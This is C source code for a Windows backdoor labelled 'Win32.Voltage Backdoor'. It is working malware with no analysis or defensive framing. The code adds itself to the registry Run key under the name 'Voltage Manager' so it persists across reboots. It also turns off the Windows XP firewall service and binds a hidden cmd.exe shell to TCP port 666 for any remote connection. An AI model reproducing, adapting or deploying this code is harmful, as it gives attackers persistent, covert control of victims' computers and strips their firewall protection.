//Win32.Voltage Backdoor (c) DR-EF



#include "stdafx.h"
#include "winsock2.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"msvcrt.lib")

#pragma comment(linker,"/ENTRY:WinMain")
#pragma comment(linker,"/MERGE:.text=.data")
#if (_MSC_VER < 1300)
	#pragma comment(linker,"/IGNORE:4078")
	#pragma comment(linker,"/OPT:NOWIN98")
#endif
#define WIN32_LEAN_AND_MEAN

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	HKEY	hkey;
	DWORD	disable_val=4,SizeOf_disable_val=sizeof(DWORD);
	WSADATA wsd;
	SOCKET fts,xshell_socket;
	sockaddr_in sin;
	STARTUPINFO xsinfo={0};
	PROCESS_INFORMATION xpinfo={0};
	char thisfile[MAX_PATH];
	DWORD tfsize=sizeof(thisfile);


	//add the backdoor to startup

	GetModuleFileName(NULL,thisfile,MAX_PATH);

	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,KEY_WRITE,&hkey)==ERROR_SUCCESS)
	{
		RegSetValueEx(hkey,"Voltage Manager",0,REG_SZ,(const unsigned char *)thisfile,tfsize);
		RegCloseKey(hkey);
	}


	//disable winXP firewall

	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\SharedAccess",0,KEY_WRITE,&hkey)==ERROR_SUCCESS)
	{
		RegSetValueEx(hkey,"Start",0,REG_DWORD,(BYTE *)&disable_val,SizeOf_disable_val);
		RegCloseKey(hkey);
	}

	//bind shell to port 666

	if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
	{
		fts=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(fts!=INVALID_SOCKET)
		{
			sin.sin_port=htons(666);	// port
			sin.sin_family=AF_INET;
			sin.sin_addr.s_addr=INADDR_ANY;
			if(bind(fts,(sockaddr *)&sin,sizeof(sin))!=SOCKET_ERROR)
			{
				for(;;)
				{
					if(listen(fts,1)!=SOCKET_ERROR)
					{
						xshell_socket=accept(fts,NULL,NULL);

						xsinfo.cb=0x44;
						xsinfo.hStdError=(HANDLE)xshell_socket;
						xsinfo.hStdInput=(HANDLE)xshell_socket;
						xsinfo.hStdOutput=(HANDLE)xshell_socket;
						xsinfo.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
						xsinfo.wShowWindow=SW_HIDE;

						CreateProcess(NULL, "cmd", NULL, NULL, TRUE,0,
							NULL, NULL, &xsinfo, &xpinfo);

						WaitForSingleObject(xpinfo.hProcess,INFINITE);

						closesocket(xshell_socket);

					}
				}
			}
		}
	}

	return 0;
}



